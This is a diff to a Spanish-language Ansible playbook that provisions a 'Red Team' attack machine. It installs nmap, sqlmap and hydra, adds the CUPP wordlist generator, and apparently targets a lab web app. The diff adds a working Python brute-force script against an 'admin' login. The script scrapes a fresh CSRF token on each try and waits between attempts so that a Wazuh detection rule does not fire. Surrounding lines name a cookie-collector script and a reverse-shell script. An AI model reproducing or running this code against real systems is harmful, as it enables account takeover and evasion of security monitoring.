@@ -1,5 +1,5 @@
 ---
-- name: Preparar entorno avanzado de ataque Red Team (Alta Concurrencia)
+- name: Preparar entorno de ataque Red Team
   hosts: redteam
   become: yes
 
@@ -15,8 +15,6 @@
         name:
           - nmap       # Escaneo de puertos y evasión de firewalls
           - sqlmap     # Inyecciones SQL automatizadas
-          - ffuf       # Fuzzing web ultrarrápido
-          - nikto      # Escáner de vulnerabilidades web
           - hydra      # Fuerza bruta paralela
           - tmux       # Multiplexor de terminal
           - htop       # Monitorización de recursos
@@ -39,24 +37,33 @@
           root hard nofile 65535
       notify: Aplicar sysctl
 
-    - name: Clonar repositorio SecLists (Diccionarios de payloads)
+
+# ===========================================================================
+#  INTEGRACIÓN DE CUPP (Generador de Diccionarios personalizados)
+# ===========================================================================
+
+    - name: Clonar repositorio oficial de CUPP
       ansible.builtin.git:
-        repo: 'https://github.com/danielmiessler/SecLists.git'
-        dest: /opt/SecLists
+        repo: 'https://github.com/Mebus/cupp.git'
+        dest: /opt/cupp
         depth: 1
 
-    - name: Configurar permisos para SecLists
+    - name: Configurar permisos de ejecución para el script de Python
       ansible.builtin.file:
-        path: /opt/SecLists
-        state: directory
+        path: /opt/cupp/cupp.py
         mode: '0755'
-    - name: Asegurar que existe el directorio de scripts en Red Team
+
+    - name: Crear enlace simbólico para acceso global a CUPP
       ansible.builtin.file:
-        path: /home/walter/scripts
-        state: directory
-        owner: walter
-        group: walter
-        mode: '0755'
+        src: /opt/cupp/cupp.py
+        dest: /usr/local/bin/cupp
+        state: link
+
+
+# ===========================================================================
+#  SCRIPTS PERSONALIZADOS
+# ===========================================================================
+
 
     - name: Script recolector de cookies (Python)
       ansible.builtin.copy:
@@ -107,6 +114,57 @@
               # Imprimimos el resultado de la función "obtener_cookies()"
               resultado = obtener_cookie()
               print(resultado)
+
+    - name: Script Fuerza bruta anti-csrf
+      ansible.builtin.copy:
+        dest: /home/walter/scripts/anti-csrf.py
+        owner: walter
+        mode: '0755'
+        content: |
+          #!/usr/bin/env python3
+
+          import requests
+          from bs4 import BeautifulSoup
+          import time
+
+          url = "http://192.168.122.144/login.php"
+          diccionario = "/home/walter/scripts/diccionario.txt"
+
+          # Creamos una "Sesión" para que el servidor nos recuerde (cookies)
+          s = requests.Session()
+
+          print("[*] Iniciando ataque de fuerza bruta con evasión de CSRF...")
+
+          with open(diccionario, "r") as file:
+              for password in file.read().splitlines():
+                  
+                  # 1. Entramos a la web para robar el token fresco
+                  respuesta_get = s.get(url)
+                  soup = BeautifulSoup(respuesta_get.text, 'html.parser')
+                  
+                  # Buscamos el campo oculto 'user_token' en el código HTML
+                  token_fresco = soup.find('input', {'name': 'user_token'})['value']
+                  
+                  # 2. Preparamos nuestro ataque mezclando la contraseña y el token robado
+                  datos_post = {
+                      'username': 'admin',
+                      'password': password,
+                      'Login': 'Login',
+                      'user_token': token_fresco
+                  }
+                  
+                  # 3. Disparamos el ataque
+                  respuesta_post = s.post(url, data=datos_post)
+                  
+                  # 4. Comprobamos si hemos pasado
+                  if "Login failed" not in respuesta_post.text:
+                      print(f"[+] ¡BINGO! Contraseña encontrada: {password}")
+                      break
+                  else:
+                      print(f"[-] Fallo: {password} (Token usado: {token_fresco[:5]}...)")
+                  
+                  # Esperamos 7 segundos para que la regla de Wazuh no nos detecte
+                  time.sleep(7)
 
     - name: Script ataque Reverse-Shell
       ansible.builtin.copy:
